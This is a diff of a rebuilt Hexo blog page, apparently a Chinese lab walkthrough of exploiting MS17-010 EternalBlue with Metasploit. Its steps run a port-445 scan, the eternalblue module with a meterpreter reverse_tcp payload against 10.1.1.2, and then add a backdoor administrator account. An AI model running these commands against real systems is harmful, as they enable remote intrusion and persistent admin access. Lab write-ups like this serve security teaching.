@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      366 字
+      369 字
     </span>
   
 
@@ -263,9 +263,9 @@
 <h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
 <h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
 <p>输入search　MS17-010</p>
-<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
+<p>找到exploit windows&#x2F;smb&#x2F;ms17_010_eternalblue,</p>
 <p>运行</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre></div>
+<div class="hljs"><pre><code class="hljs awk">use exploitwindows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue</code></pre></div>
 
 <p>输入 show options  查看需要配置哪些信息</p>
 <p>RHOSTS 为目标主机IP(10.1.1.2)</p>
@@ -274,11 +274,9 @@
 <p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" srcset="/img/loading.gif" alt="5.png"> </p>
 <p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" srcset="/img/loading.gif" alt="6.png"></p>
 <h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
-<div class="hljs"><pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre></div>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</code></pre></div>
 
-
-
-<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
+<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit&#x2F;run </p>
 <p>成功获取shell</p>
 <p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" srcset="/img/loading.gif" alt="7.png"></p>
 <p>查看ip地址验证是否为目标主机。</p>
@@ -289,7 +287,7 @@
 <p>Username:test </p>
 <p>password:abc123.com</p>
 <p>将该用户加入管理员组，使其拥有管理员权限</p>
-<div class="hljs"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre></div>
+<div class="hljs"><pre><code class="hljs bash">net localgroup administrtors <span class="hljs-built_in">test</span> /add</code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" srcset="/img/loading.gif" alt="10.png"></p>
 <p>目标主机上用户创建成功</p>
